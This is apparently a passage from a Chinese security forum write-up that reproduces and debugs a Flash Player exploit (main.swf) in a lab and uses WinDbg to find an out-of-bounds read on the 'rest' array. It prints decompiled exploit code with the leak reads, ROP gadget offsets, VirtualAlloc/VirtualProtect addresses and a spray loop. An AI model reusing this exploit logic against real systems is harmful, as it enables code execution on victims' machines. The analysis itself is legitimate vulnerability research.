
| 1  2  3  4 | `<?xml version="1.0"?>`  `<cross-domain-policy>`  `<allow-access-from domain="*"/>`  `</cross-domain-policy>` |

有了这个文件就允许任意域名跨域访问资源了。

### 3.1.2 漏洞利用主机

IP地址：`192.168.6.40`

修改hosts文件，添加记录：

|  |  |

| --- | --- |

| 1 | `192.168.6.198`  `2b5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4E0j5$3W2S2i4K6u0W2K9h3&6X3L8H3`.`. ` |

使用`Fiddler`抓包查看网络连接情况，使用`Process Explorer`监控进程执行情况。

之后打开IE，访问`` ce6K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3q4E0j5$3W2S2i4K6u0W2K9h3&6X3L8#2)9J5c8X3y4$3k6g2)9J5k6o6t1H3x3e0q4Q4x3X3b7J5x3e0p5H3i4K6u0W2K9s2c8E0L8l9`.`. ``，可以看到`Fiddler`中：

![图片描述](https://bbs.kanxue.com/upload/attach/202108/600394_7DDQ8UJT94CCSTN.png)

以及`Porcess Explorer`中：

![图片描述](https://bbs.kanxue.com/upload/attach/202108/600394_A58XYBSVC434D3G.png)

由于我之前设置了`windbg`作为默认调试器，因此，此时`windbg`已经自动弹出来了：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7 | `(e04.810): Invalid lock sequence - code c000001e (!!! second chance !!!)`  `eax=00000000` `ebx=7ffd4000` `ecx=00000000` `edx=004033d9` `esi=00000000` `edi=00000000`  `eip=00403425` `esp=0012ff5c` `ebp=0012ff88` `iopl=0`         `nv up ei ng nz ac po cy`  `cs=001b`  `ss=0023`  `ds=0023`  `es=0023`  `fs=003b`  `gs=0000`             `efl=00010293`  `*** ERROR: Module load completed but symbols could` `not` `be loaded` `for` `C:\Users\test\AppData\Local\Temp\Low\scvhost.exe`  `scvhost+0x3425:`  `00403425` `f04b            lock dec ebx` |

在此也可以看出`scvhost.exe`的路径在临时文件夹中。

***注：这里用于实验的`main.swf`并不是特别稳定，因此需要选择合适的`Flash`版本才能执行到`scvhost.exe`出现，除此之外，windows要选择32位的，IE版本也不能太高，我也是实验了几次才最终得到了这个结果。***

根据之前对代码简单分析，这里出现异常的`scvhost.exe`应该就是`cd.txt`解码之后的结果，`main.swf`利用了`Adobe Flash`中存在的漏洞，实现了恶意程序的执行。所以现在的问题应该是`main.swf`是怎样利用了这个漏洞，而不是最终执行起来的恶意程序为什么出现了异常。

书中提供了针对`swf`文件，在漏洞利用早期触发异常，从而定位漏洞位置的方法。

# 4. 触发异常，定位漏洞位置

对于用于漏洞利用的`swf`文件，可以直接修改反编译得到的脚本代码，再使用工具[`Flash Builder`](https://bbs.kanxue.com/elink@7adK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8g2)9J5k6h3#2&6j5i4m8H3i4K6u0W2j5$3!0E0i4K6u0r3L8%4u0A6k6$3W2F1j5h3I4Q4x3V1k6a6k6X3k6A6j5$3g2Q4x3V1k6r3L8r3q4K6K9p5u0#2K9h3I4V1k6i4u0Q4y4h3j5@1i4K6g2X3y4W2)9#2k6V1I4e0x3e0m8Q4y4h3j5K6x3U0f1J5y4U0S2Q4x3X3g2W2P5r3f1`.)重新进行编译，生成新的`swf`文件。但是应该怎么修改呢？需要分析一下反编译得到的代码：

漏洞利用的主要代码都集中在`test`函数中，这个函数代码开头是这样的：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23 | `public function test(... rest) : void`  `{`  `var _loc8_:int = 0;`  `var _loc2_:Number = new Number(parseFloat(String(rest[0x4000000E])));`  `var _loc3_:ByteArray = new ByteArray();`  `_loc3_.position = 0;`  `_loc3_.writeDouble(_loc2_);`  `var _loc4_:uint = _loc3_[0] * 0x1000000 + _loc3_[1] * 0x10000 + _loc3_[2] * 0x100 + _loc3_[3];`  `this.baseaddr = _loc4_;`  `this.code.position = 0;`  `this.code.endian = Endian.LITTLE_ENDIAN;`  `this.code.writeInt(this.pobj - 1 + 16 + 409600);`  `this.code.endian = Endian.BIG_ENDIAN;`  `this.code.writeUnsignedInt(0x41414141);`  `this.code.writeUnsignedInt(0x41414141);`  `this.code.writeUnsignedInt(0x41414141);`  `_loc8_ = 0;`  `while(_loc8_ < 102400)`  `{`  `this.code.writeUnsignedInt(0x41414141);`  `_loc8_++;`  `}`  `...` |

一开始的`_loc2_`从`rest`参数数组的`0x4000000E`偏移处读取了一个数值，这里肯定是有问题的，正常来说不可能是这么大的偏移。所以漏洞就出现在这里，它允许对`rest`参数数组进行越界的读取。但是这个越界读取对应到`Adobe Flash`软件中，又是什么情况呢？

继续往下看，读取的这个数经过处理之后变成了`this.baseaddr`。也就是说，由于漏洞的存在，我们可以通过越界读取获取内存中的保存的数据，并在之后使用。

`test`函数后面利用这个`baseaddr`，通过进一步计算，得到了更多的后续使用的数值：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11 | `this.xchg_eax_esp_ret = this.baseaddr - 0x3F48E7;`  `this.xchg_eax_esi_ret = this.baseaddr - 0x2FF589;`  `this.pop_eax_ret = this.baseaddr - 0x405D48;`  `this.VirtualAlloc = this.baseaddr + 0xA6626;`  `this.jmp_eax = this.baseaddr - 0x3FF11F;`  `this.pop_ecx = this.baseaddr - 0x405DA0;`  `this.mov_eax_ecx = this.baseaddr - 0x3B90CC;`  `this.inc_eax_ret = this.baseaddr - 0x405D4C;`  `this.dec_eax_ret = this.baseaddr - 0x3BBD96;`  `this.to_eax = this.baseaddr - 0x3ADC67;`  `this.virtualprotect = this.baseaddr + 0xA65F2;` |

不同的`Flash`版本计算的数值不同，这也是为什么一开始环境搭建的时候有些`Flash`版本并没有成功进行漏洞利用，因为这里的代码并没有考虑所有的情况，对环境依赖严重。

之后开始构建`shellcode`，后续还存在两次利用数组越界读取获取信息的代码：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25 | `var _loc5_:Number = new Number(parseFloat(String(rest[0x3FFFFF96])));`  `var _loc6_:ByteArray;`  `(_loc6_ = new ByteArray()).writeDouble(_loc5_);`  `var _loc7_:uint = _loc6_[0] * 0x1000000 + _loc6_[1] * 0x10000 + _loc6_[2] * 0x100 + _loc6_[3];`  `this.pobj = _loc7_;`  `_loc8_ = 0;`  `this.pobj += 56;`  `_loc8_ = 0;`  `while(_loc8_ < 100)`  `{`  `this.code.writeInt(this.pobj);`  `_loc8_++;`  `}`  `var _loc9_:Number = new Number(parseFloat(String(rest[0x3FFFFFBA])));`  `_loc3_.position = 0;`  `_loc3_.writeDouble(_loc9_);`  `_loc4_ = _loc3_[0] * 0x1000000 + _loc3_[1] * 0x10000 + _loc3_[2] * 0x100 + _loc3_[3];`  `this.pobj = _loc4_ + 2;`  `ExternalInterface.call("",this.pobj.toString(16));`  `_loc8_ = 0;`  `while(_loc8_ < 100)`  `{`  `this.code.writeInt(this.pobj);`  `_loc8_++;`  `}` |

所以现在关键是要确定`rest`参数越界读取是发生在哪里，读取的数值又是什么。

可以修改函数一开始越界读取的索引值，原本是

|  |  |

| --- | --- |

| 1 | `var _loc2_:Number = new Number(parseFloat(String(rest[0x4000000E])));` |

按照书中所说修改成`0x41414141`，重新进行测试，`windbg`断在了这里：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7 | `(cb8.7dc): Access violation - code c0000005 (!!! second chance !!!)`  `eax=41414141` `ebx=0594a040` `ecx=0256d07c` `edx=0256d07c` `esi=0581a0d0` `edi=0581a0d0`  `eip=68f724b5` `esp=0256cef4` `ebp=0256d020` `iopl=0`         `nv up ei pl nz na po nc`  `cs=001b`  `ss=0023`  `ds=0023`  `es=0023`  `fs=003b`  `gs=0000`             `efl=00050202`  `*** ERROR: Symbol file could not be found.  Defaulted to export symbols` `for` `C:\Windows\system32\Macromed\Flash\Flash10s.ocx` `-`  `Flash10s!DllUnregisterServer+0x274e3d:`  `68f724b5` `8b0481`          `mov     eax,dword ptr [ecx+eax*4] ds:0023:075bd580=????????` |

注意到`eax`寄存器的值就是`0x41414141`，程序尝试从`ecx+eax*4`的位置读取数值，这里很好理解，`ecx`保存的是`rest`参数基地址，`eax`是偏移，最后计算出具体位置。

# 5. 漏洞利用过程调试

所以现在可以确定漏洞位置位于`Flash10s!DllUnregisterServer+0x274e3d`，接下来还是用之前正确的`main.swf`，用`windbg`附加到`IE`上，然后在漏洞位置设置断点，再打开目标网址，`windbg`断在断点处：

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8 | `0:011> bu Flash10s!DllUnregisterServer+0x274e3d`  `0:011> g`  `Breakpoint 0 hit`  `eax=4000000e` `ebx=0598d040` `ecx=0276cfec` `edx=0276cfec` `esi=058fa0d0` `edi=058fa0d0`  `eip=674224b5` `esp=0276ce74` `ebp=0276cf90` `iopl=0`         `nv up ei pl nz na po nc`  `cs=001b`  `ss=0023`  `ds=0023`  `es=0023`  `fs=003b`  `gs=0000`             `efl=00040202`  `Flash10s!DllUnregisterServer+0x274e3d:`  `674224b5` `8b0481`          `mov     eax,dword ptr [ecx+eax*4] ds:0023:0276d024=0276d078` |

可以看到在偏移值为`0x4000000E`的情况下，读取到的数据是`0x0276d078`，但是这个值有什么用呢？

如果多次测试，我这里贴出多次测试得到的结果：

|  |  |

| --- | --- |
